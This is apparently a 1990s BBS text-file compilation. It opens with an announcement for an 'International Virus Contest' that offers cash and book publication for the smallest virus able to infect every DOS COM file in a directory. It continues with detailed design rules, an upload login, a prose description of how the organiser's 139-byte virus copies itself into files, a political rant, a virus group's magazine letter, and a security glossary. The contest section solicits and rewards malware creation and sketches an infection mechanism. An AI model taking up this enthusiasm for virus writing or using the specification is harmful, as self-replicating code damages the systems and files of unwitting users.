        Ok, all you genius hackers out there! Here is a challenge
for you. Prove your stuff!

        This is an INTERNATIONAL contest, and this file is
being circulated all over the world, so if you want to compete,
be forewarned, you've got worldwide competition. Only the best
have a chance in this game.

Still up to the challenge?

Ok, here it is:

I am writing Volume 2 of The Little Black Book of Compter
Viruses. This is a study of the scientific applications of
computer viruses, and their use in artificial life research,
and all of that neat stuff. One of the things I want to discuss
in the book is the limit on the size of a virus for a given
level of functionality. So I took the TIMID virus from Volume 1
and tore it down to the bare minimum. Not good enough. I wrote
a virus that worked a little differently. I tore that one down
to the bare minimum. Good enough? Well maybe. But maybe not.
I have some pretty compact code, but is it the absolute best?
I'm guessing somebody out there can top it.

Here are the rules:

(1) The object of this game is to write the smallest
    virus you can with the required level of functionality.

(2) The virus must be capable of infecting all COM files
    on the logged drive in the current directory of a PC,
    no matter how many COM files are there. It may infect
    them as quickly or as slowly as you like, so long as
    it can be demonstrated that it will do so in an hour,
    when running the programs in that directory one after
    the other in sequential order.

(3) The virus must recognize itself and avoid re-infecting
    files that have been infected. At most, only one in
    fifty thousand files should get accidently re-infected,
    assuming that the data in unknown COM files is random.

(4) The virus must terminate gracefully if it cannot find a
    file to infect.

(5) The virus must not destroy any of the code in any file
    which it infects. It must allow that code to execute
    properly, or refuse to infect a file.

(6) The virus must be self-contained. It cannot hide
    code in some common location on disk.

(7) The virus must function properly under MS-DOS 5.0 with
    no TSR's resident, and nothing loaded high.

(8) The size will be determined by the larger of (A) the
    number of bytes the virus code itself takes up in
    an infected file, and (B) the largest number of bytes
    the virus adds to a program when it infects it.

The best code I have for a virus that follows these rules right
now is 139 bytes long. Both source and executable are included
in the ZIP, named LITTLE.ASM and LITTLE.COM.

In the event of a tie for size, originality and ingenuity of
the code will break the tie. All judges decisions are final.

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

The winner will receive the following:

(1) A $100 CASH REWARD.

(2) Your code will be published in "The Little Black Book
    of Computer Viruses", Volume 2.

(3) I will give you credit for the code and for winning
    the International Virus Contest in the book, using
    either your real name or an alias, your choice,
    published in the book.

(4) Your name will be posted on the MISS bulletin board
    as the contest winner.

(5) A free copy of "The Little Black Book of Computer
    Viruses", Volume 2, and a one year subscription to
    Computer Virus Developments Quarterly ($95 value).

Three honorable mention winners will receive a free copy of
The Little Black Book of Computer Viruses, Volume 2.

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

You may make an entry in two ways:

(1) Mail your entry on a PC format floppy disk to American Eagle
Publications, Inc., PO Box 41401, Tucson, AZ 85717 USA.

(2) Upload your entry to the M.I.S.S. bulletin board at
(805)251-0564 in the USA. Log on as GUEST, password VIRUS,
last 4 digits of phone number 0000, and upload to the CONTEST
UPLOADS directory.

A valid entry consists of the following items:

(A) Complete source code for a virus, which can be assembled
using either TASM, MASM, or A86. If you use another assembler
and don't know if one of the above will work, then send the
assembler along with the submission. If you do anything tricky
that we may not understand, you must explain it in comments in
the assembler source.

(B) A statement of who you are (aliases accepted) and how to
get in touch with you in case you win the contest. This
information will be kept strictly confidential, and encrypted
at all times.

+++++++
No Virus Contest is complete without POLITICAL COMMENT:

Freedom is only free if it is VOLUNTARY. If you live in a
"democratic" nation that will not allow secession, then you DO
NOT live in a free country. The democracies of this world are
learning how to become tyrannies. Support a Secession Ammendment
for your constitution, before it is too late and you wish you
had. Secession is the only logical way to short-circuit the trend
toward big government and tyranny, short of all-out civil war.

;Basic explanation of how this virus works:
;
;The virus takes control when the program first starts up. All of its code
;is originally located at the start of a COM file that has been infected.
;When the virus starts, it takes over a segment 64K above the one where the
;program was loaded by DOS. It copies itself up there, and then searches
;for an uninfected file. To determine if a file is infected, it checks the
;first two bytes to see if they are the same as its first two bytes. It
;reads the file into memory right above where it is sitting (at 100H in the
;upper segment).  If not already infected, it just writes itself plus the
;file it infected back out to disk under the same file name. Then it moves
;the host in the lower segment back to offset 100H and executes it.

The following letter and editorial response appears in the February
1993 issue of the UK magazine 'Personal Computer World' under the
heading "Spreading viruses":

      We are a bunch of programmers who, depressed with the lack of
   viruses that have originated in England, have sought to change
   matters.  We presently write viruses for the PC, Archimedes and Atari
   ST.  We have increased the few viruses written in England by about
   25, though this number is increasing all the time as our programmers
   churn out more quality computer viruses.
      Although there are many viruses about we hope to dominate the UK
   'market'.  Won't it be nice, though, for England to have at least one
   export?
      Finally, we as an organisation like to stress that, contrary to
   public opinion, we are *not* boring people who wear anoraks, nor are
   we depraved people who were beaten as children and so grew up with a
   hatred of humanity.
      We are highly intelligent and good at programming and are just
   ordinary people.  But we are gonna get you soon!


                                                                   ARCV
                                  (Association of Really Cruel Viruses)
[And the editor replies:]

   You say you're not depraved people?  Perhaps you weren't beaten as
   children, but as far as we're concerned you should be beaten as adults.


I wish it were the April issue...

                Glossary of Computer Insecurity

           Compiled by Johnathan Vail (vail@tegra.com)
        Created by several people on comp.virus newsgroup

________________________________________________________________________


async interrupt (attack) - to exploit system vulnerabilities arising
    from deficiencies in the interrupt management facilities of an
    operating system.


back door - This is an undocumented feature added to a product which
    can allow those who know about it to gain access to features that are
    otherwise protected.  The original Tempest video game was supposed to
    have a key sequence that would allow the author of the firmware to get
    free games in an arcade.  Some military systems are rumored to have
    back doors in their software that prevents their being used against
    the countries that built them.


blivet (attack) - A denial-of-service attack performed by hogging
    limited resources that have no access controls (for example, shared
    spool space on a multi-user system). [Classically defined as "ten pounds
    of horsesh*t in a five pound bag"]


browsing - Gaining unauthorized read-only access to files.


C2 Catch-22  - Refers to the paradox that all federal computers are
    required to be certified to the C2 level of Trust (or better) by 1992
    (especially if they are to be permitted access to a network), yet
    because no C2 certification has ever been performed with the network
    software active, NSA will revoke the certification of any system as
    soon as it is connected to a network.  [Also "C2-by-'92 Catch-22".]


cascading - To gain additional privileges on a host (or within a
    process) by using those privileges legitimately (if perhaps unwisely)
    granted to casual users.


crayola books - A disparaging reference to the "rainbow books",
    commonly used when referring to the upcoming rewrite of NSA's
    technical computer security guidelines.


crypt (attack) - Stealing the system password file and looking for
    known encrypted passwords.


data diddling - To alter another's data (especially, to do so subtly
    so it will not be detected); a major breach of the hacker ethic.


denial-of-service attack - Any method which an intruder might use to injure
   authorized users of a system by making its facilities unavailable.  Often
   easier to accomplish than hijacking a privileged account.


dictionary (attack) - Trying a dictionary of commonly used or vendor
    installed passwords.


Easter Egg - This is a usually benign feature added to a product by
    the programmer without official knowledge or consent.  One example of
    the is the 'xyzzy' command in Data General's AOS operating system.
    Another is the "RESIST THE DRAFT" message in an unused sector of Apple
    Logo.


ethical hacker - Someone who espouses the view that he/she may
    "ethically" penetrate any computer or network so long as no data is
    altered.  [Colloquially among computer security professionals: a dead
    hacker (or one who has ceased hacking).]


leapfrog (attack) - Using userid and password information obtained
    illicitly from one host (e.g., downloading a file of account IDs and
    passwords, tapping TELNET, etc.) to compromise another host.  Also, to
    TELNET through one or more hosts in order to confuse a trace (standard
    cracker procedure).


masquerading - To assume the identity of another user to gain
    unauthorized access to a host or network.


mockingbird - Software that intercepts communications (especially
    logon processes) between users and hosts and provides system-like
    responses to the users while obtaining information (especially account
    IDs and passwords).


pest - A set of instructions that self-replicates uncontrollably,
    eventually rendering a network or system unusable via a
    blivet attack. [sometimes called "wabbits"]


phage - An autonomous program that inserts malicious code into
    other autonomous programs (e.g., a computer worm or probe
    that carries a virus or trojan horse program).


polymorphic virus - 1. A virus using variable encryption with a
    variable decryption routine to avoid detection by its
    "signature".  V2P6, Whale, Maltese, Amoeba, Russian Mutant
    and PC-Flu 2 are examples. 2. Any virus that changes it's
    behaviour such as infect different types of host or change
    their mode of operation.  A virus that infects both .COM and
    .EXE programs as well as boot sectors can be considered
    polymorphic.


probe - A non-self-replicating, autonomous program (or set of
    programs) that has the ability to execute indirectly
    through a network or multi-partition computer system
    (e.g., various hacker utilities).


rainbow books - NSA's technical computer security guidelines.
    So named because each of the books is published with a
    different color cover.  [See "crayola books".]


scavenging - To exploit unerased residual data.  The controversy with
    the Prodigy [users finding pieces of the their data in the
    STAGE.DAT file] service is an alleged example of this.


spoofing - An attack which relies on the inability of users or computer
    systems to verify the identity or location of a communication partner.
    A `mockingbird' spoofs the computer's login sequence to fool a user;
    some cracking software repeatedly spoofs human login actions to fool
    the computer.


stealth virus - A type of virus that attempts to hide its existence.
    A common way of doing this on IBM PCs is for the virus to hook
    itself into the BIOS or DOS and trap sector reads and writes that
    might reveal its existence.


trapdoor - A method of bypassing a sequence of instructions, often
    some part of the security code (e.g. the computer logon).


time bomb - This is code or a program that checks the systems clock in
    order to trigger its active symptoms.  The popular legend of the time
    bomb is the programmer that installs one in his employer's computers
    to go off in case he is laid off or fired.


trojan (horse) - This is some (usually nasty) code that is added to,
    or in place of, a harmless program.  This could include many viruses
    but is usually reserved to describe code that does not replicate
    itself.


unknown system-state (attack) - To exploit the conditions that occur
    after a partial or total system crash (e.g., some files remain open
    without an end-of-file condition allowing an intruder to obtain
    unauthorized access to other files by reading beyond the real EOF when
    service is resumed).


virus - a piece of code that is executed as part of another program
    and can replicate itself in other programs.  The analogy to real
    viruses is pertinent ("a core of nucleic acid, having the ability to
    reproduce only inside a living cell").  Most viruses on PCs really are
    viruses.


worm - An autonomous program (or set of programs) that can replicate
    itself, usually over a network.  A worm is a complete program by
    itself unlike a virus which is either part of another program or
    requires another program's thread of execution to operate.  Robert
    Morris's program, the Internet Worm, is an example of a worm although
    it has been mistakenly identified in the popular media as a virus.
